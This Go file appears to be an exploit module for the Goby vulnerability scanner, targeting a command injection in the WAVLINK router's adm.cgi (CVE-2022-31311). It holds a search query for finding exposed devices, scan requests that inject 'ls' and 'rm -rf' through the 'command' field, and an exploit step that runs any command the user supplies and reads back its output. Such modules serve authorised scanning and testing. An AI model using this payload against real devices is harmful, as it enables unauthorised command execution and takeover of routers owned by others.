package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "wavlink adm.cgi command execution",
    "Description": "<p>An issue in adm.cgi of WAVLINK AERIAL X 1200M M79X3.V5030.180719 allows attackers to execute arbitrary commands via a crafted POST request.</p>",
    "Product": "wavlink",
    "Homepage": "https://www.wavlink.com",
    "DisclosureDate": "2022-07-05",
    "Author": "",
    "FofaQuery": "body=\"firstFlage\"",
    "GobyQuery": "body=\"firstFlage\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to execute system commands to gain server privileges.</p>",
    "Recommendation": "<p>Contact the manufacturer for a repair solution: <a href=\"https://www.wavlink.com\">https://www.wavlink.com</a></p>",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2022-31311"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/adm.cgi",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "page=sysCMD&command=\";ls>./1.txt;\""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/1.txt",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": ".cgi",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/adm.cgi",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "page=sysCMD&command=\";rm -rf ./1.txt;\""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/adm.cgi",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "page=sysCMD&command=\";{{{cmd}}}>./1.txt;\""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/1.txt",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)(.*)"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/adm.cgi",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "page=sysCMD&command=\";rm -rf ./1.txt;\""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Internet of Things",
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2022-31311"
    ],
    "CNNVD": [
        "CNNVD-202206-1299"
    ],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "wavlink adm.cgi命令执行漏洞",
            "Product": "WAVLINK",
            "Description": "<p>WAVLINK是中国睿因科技（WAVLINK）公司开发的一款路由器，该系统adm.cgi存在命令执行漏洞，攻击者可通过该漏洞获取服务器权限。<br></p>",
            "Recommendation": "<p>联系厂商获取修复方案：<a href=\"https://www.wavlink.com\">https://www.wavlink.com</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞执行系统命令获取服务器权限。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行",
                "物联网"
            ]
        },
        "EN": {
            "Name": "wavlink adm.cgi command execution",
            "Product": "wavlink",
            "Description": "<p>An issue in adm.cgi of WAVLINK AERIAL X 1200M M79X3.V5030.180719 allows attackers to execute arbitrary commands via a crafted POST request.<br></p>",
            "Recommendation": "<p>Contact the manufacturer for a repair solution: <a href=\"https://www.wavlink.com\">https://www.wavlink.com</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to execute system commands to gain server privileges.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Internet of Things",
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10692"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}